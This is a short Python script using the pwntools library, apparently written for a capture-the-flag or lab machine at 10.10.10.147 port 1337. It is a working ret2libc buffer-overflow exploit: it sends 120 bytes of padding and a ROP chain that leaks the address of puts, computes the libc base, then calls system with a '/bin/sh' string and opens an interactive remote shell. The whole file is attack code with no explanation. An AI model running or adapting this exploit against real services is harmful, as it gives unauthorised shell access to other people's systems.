#!/usr/bin/env python
from pwn import * 
context(os="linux", arch="amd64") 
#context(log_level='DEBUG') 

junk = "A"*120 

got_puts = p64(0x404018)
plt_system = p64(0x401040) 
pop_rdi = p64(0x40120b) 
main = p64(0x40115f) 
payload = junk + pop_rdi + got_puts + plt_system + main 
p = remote("10.10.10.147", 1337) 
p.recvline() 
p.sendline(payload) 
leaked_puts = u64(p.recvline().strip()[7:-11].ljust(8,"\x00")) 

log.info("Leaked puts address: %x" % leaked_puts) 
libc_base = leaked_puts - 0x68f90 
log.info("libc_base: %x" % libc_base) 

sh = p64(0x161c19 + libc_base) 

payload = junk + pop_rdi + sh + plt_system 
p.recvline() 
p.sendline(payload) 
p.interactive() 
